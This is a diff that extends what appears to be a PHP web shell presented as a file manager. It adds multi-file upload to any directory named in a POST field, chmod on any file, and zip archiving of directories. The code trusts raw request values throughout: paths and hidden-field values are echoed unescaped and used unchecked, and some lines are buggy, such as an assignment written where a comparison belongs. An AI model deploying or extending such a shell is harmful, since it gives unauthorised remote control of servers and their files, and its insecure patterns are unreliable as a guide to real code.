@@ -1,4 +1,5 @@
 <title><?= get_current_user() ?></title>
+
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
@@ -219,6 +220,42 @@ class Files {
     			break;
     	} print("'></img>");
     }
+
+    function unzip($source, $destination) {
+    	$zip = new ZipArchive();
+    	if ($zip->open($source) === true) {
+    		$zip->extractTo($destination);
+    		$zip->close();
+    	}
+	}
+
+	function zip($source, $destination) {
+		if (extension_loaded('zip')) {
+			if (file_exists($source)) {
+				$zip = new ZipArchive();
+				if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
+					if (is_dir($source)) {
+						$iterator = new RecursiveDirectoryIterator($source);
+						// skip dot files while iterating 
+						$iterator->setFlags(RecursiveDirectoryIterator::SKIP_DOTS);
+						$files = new RecursiveIteratorIterator($iterator, RecursiveIteratorIterator::SELF_FIRST);
+						foreach ($files as $file) {
+							$root = $_SERVER['DOCUMENT_ROOT'];
+							if (is_dir($file)) {
+								$zip->addEmptyDir(str_replace($root, '', $file . '/'));
+							} else if (is_file($file)) {
+								$zip->addFromString(str_replace($root, '',  $file), file_get_contents($file));
+							}
+						}
+					} else if (is_file($source)) {
+						$zip->addFromString(basename($source), file_get_contents($source));
+					}
+				}
+				return $zip->close();
+			}
+		}
+		return false;
+	}
 
 	function delete($path) {
 		if (file_exists($path)) {
@@ -509,10 +546,12 @@ switch (@$_POST['action']) {
 		<tr>
 			<td colspan="5">
 				<form method="post" enctype="multipart/form-data">
+					<input type="hidden" name="destination" value="<?= str_replace(basename($_POST['destination']), '', $_POST['destination']) ?>">
 					<input type="file" name="file[]" multiple>
 				</td>
 			<td>
 					<input type="submit" name="submit" value="UPLOAD">
+					<input type="hidden" name="action" value="upload">
 				</form>
 			</td>
 		</tr>
@@ -520,13 +559,36 @@ switch (@$_POST['action']) {
 		if (isset($_POST['submit'])) {
 			$file = count($_FILES['file']['tmp_name']);
 			for ($i=0; $i < $file ; $i++) { 
-				if (copy($_FILES['file']['tmp_name'][$i], $_FILES['file']['name'][$i])) {
+				if (copy($_FILES['file']['tmp_name'][$i], $_POST['destination'].DIRECTORY_SEPARATOR.$_FILES['file']['name'][$i])) {
 					alert("success", "uploaded <u>{$_FILES['file']['name'][$i]}</u>");
 				} else {
 					alert("failed");
 				}
 			}
 		}
+		exit();
+		break;
+	case 'chmod':
+		if (isset($_POST['submit'])) {
+			if (chmod($_POST['file'], $_POST['mode'])) {
+				print("success");
+			} else {
+				print("Failed");
+			}
+		}
+		?>
+		<form method="post">
+			<tr>
+				<td>
+					<input type="text" name="mode" value="<?= substr(sprintf("%o", fileperms($_POST['file'])), -4) ?>">
+				</td>
+				<td>
+					<input type="submit" name="submit">
+				</td>
+			</tr>
+		</form>
+		<?php
+		exit();
 		break;
 }
 ?>
@@ -541,7 +603,17 @@ switch (@$_POST['action']) {
 	<form method="post">
 		<td colspan="6">
 			<center>
-				<button name="action" value="upload">UPLOAD</button>
+				<?php
+				foreach (scandir(cwd()) as $value) {
+					if (is_dir($value) || $value === '.' || $value === '..') continue;
+					?> <button name="action" value="upload">UPLOAD</button>
+						<input type="hidden" name="destination" value="<?= cwd().DIRECTORY_SEPARATOR.$value ?>"><?php
+					if ($value = 1) {
+						break;
+					}
+				}
+				?>
+				
 			</center>
 		</td>
 	</form>
@@ -581,6 +653,7 @@ foreach ($iterator as $dir) {
 						<option selected>CHOOSE . .</option>
 						<option value="delete">DELETE</option>
 						<option value="rename">RENAME</option>
+						<option value="chmod">CHMOD</option>
 					</select>
 					<input type="hidden" name="file" value="<?= $dir->getPathname() ?>">
 					<input type="hidden" name="dirs" value="<?= cwd() ?>">
@@ -631,6 +704,7 @@ foreach ($iterator as $files) {
 								<option selected>CHOOSE . .</option>
 								<option value="delete">DELETE</option>
 								<option value="rename">RENAME</option>
+								<option value="chmod">CHMOD</option>
 							</select>
 							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
 							<input type="hidden" name="dirs" value="<?= cwd() ?>">
@@ -644,6 +718,7 @@ foreach ($iterator as $files) {
 								<option value="edit">EDIT</option>
 								<option value="delete">DELETE</option>
 								<option value="rename">RENAME</option>
+								<option value="chmod">CHMOD</option>
 							</select>
 							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
 							<input type="hidden" name="dirs" value="<?= cwd() ?>">
@@ -670,7 +745,7 @@ foreach ($iterator as $files) {
 			<option value="1">DELETE</option>
 			<option value="backup">BACKUP</option>
 			<option value="download">DOWNLOAD</option>
-			<option value="zip">COMPRESS TO ZIP</option>
+			<option value="2">COMPRESS TO ZIP</option>
 		</select>
 	</td>
 	</form>
@@ -684,13 +759,19 @@ if (!empty($data = @$_POST['data'])) {
 					alert("failed", "failed");
 				} else {
 					if (isset($_POST['dirs'])) {
-						chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
+						chdir(str_replace(basename($filename), '', $filename));
 					}
-					?>
-					<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
-					<?php
+					?> <input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>"> <?php
 				}
 			break;
+			case '2':
+				?> <input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>"><?php
+				if ($file->zip(basename($filename), str_replace(basename($filename), '', $filename)."/backup.zip")) {
+					alert("success", basename($filename) ." success compress to zip !");
+				} else {
+					alert("failed", basename($filename) . " failed");
+				}
+				break;
 		}
 	}
 }
